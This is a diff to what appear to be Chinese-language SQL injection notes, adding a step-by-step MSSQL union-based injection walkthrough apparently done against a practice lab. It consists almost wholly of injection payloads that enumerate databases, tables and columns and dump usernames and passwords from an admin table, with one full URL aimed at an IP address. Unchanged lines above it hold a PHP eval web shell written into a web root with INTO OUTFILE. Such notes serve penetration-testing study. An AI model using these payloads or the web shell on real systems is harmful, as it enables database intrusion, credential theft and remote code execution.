@@ -112,3 +112,65 @@ id=1'--+
 
 
 select '<?php @eval($_POST[19801]);?>'INTO OUTFILE 'C://Users//Administrator//Desktop//UPUPW_AP5.2-1510//UPUPW_AP5.2//htdocs//19801.php'
+
+mssql=sqlserver 注入{
+2、判断字段长度
+order by
+
+3、找显位
+id=-2 union all select 1,'2','3',4
+
+4、查询基本信息（数据库名）
+db_name
+ ?id=2 and 1=2 union all select 1,(select db_name()), '3', 4 找到数据库名称。
+ mozhe_db_v2
+
+5、查表名   xtype='U' 为 用户表
+id=-2 union all select 1,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype='u'),'3',4
+
+6、查列名
+id=-2 union all select 1,(select top 1 col_name(object_id('manage'),2) from sysobjects),(select top 1 col_name(object_id('manage'),3) from sysobjects),4
+
+7、获取数据
+id=-2 union all select 1,usename,password,4 from manage
+
+获取当前用户和数据库版本和当前数据库
+?id=-2 union all select 1,system_user,@@version,2
+?id=-2 union all select 1,system_user,db_name(),2
+
+加号的使用
+
+%2B是+的编码，url中不能直接使用，否则会别解析为空格
+
+http://219.153.49.228:49135/new_list.asp?id=2 and 1=0 union all select 1,system_user%2B'|'%2Bdb_name(),@@version,2
+
+翻译成为
+
+http://219.153.49.228:49135/new_list.asp?id=2 and 1=0 union all select 1,system_user+'|'+db_name(),@@version,2
+
+枚举出当前所有的数据库
+
+?id=-2 union all select 1,system_user%2B'|'%2Bdb_name(),name,2 from master..sysdatabases
+?id=-2 union all select 1,system_user%2B'|'%2Bdb_name(),name,2 from master..sysdatabases where name not in('master')
+直到报错
+?id=-2 union all select 1,system_user%2B'|'%2Bdb_name(),name,2 from master..sysdatabases where name not in('master','model','mozhe_db_v2','msdb','tempdb')
+枚举库所有列表
+?id=-2 union all select 1,system_user%2B'|'%2Bdb_name(),name,2 from mozhe_db_v2..sysobjects
+where xtype='u'
+?id=-2 union all select 1,system_user%2B'|'%2Bdb_name(),name,2 from mozhe_db_v2..sysobjects 
+
+where xtype='u' and name not in ('manage')
+直到报错
+?id=-2 union all select 1,system_user%2B'|'%2Bdb_name(),name,2 from mozhe_db_v2..sysobjects 
+
+where xtype='u' and name not in ('manage','announcement')
+枚举出表的字段名
+?id=-2 union all select 1,(select top 1 col_name(object_id('manage'),1) from sysobjects),'3',nul
+?id=-2 union all select 1,(select top 1 col_name(object_id('manage'),2) from sysobjects),'3',nul
+?id=-2 union all select 1,(select top 1 col_name(object_id('manage'),3) from sysobjects),'3',nul
+获取到manage的字段名为：id,username,password
+
+爆字段内容
+?id=-2 union all select 1,(select username from manage),(select password from manage where username in ('admin')),null
+?id=-2 union all select 1,(select password from manage),(select username from manage where password in ('admin')),null
+}
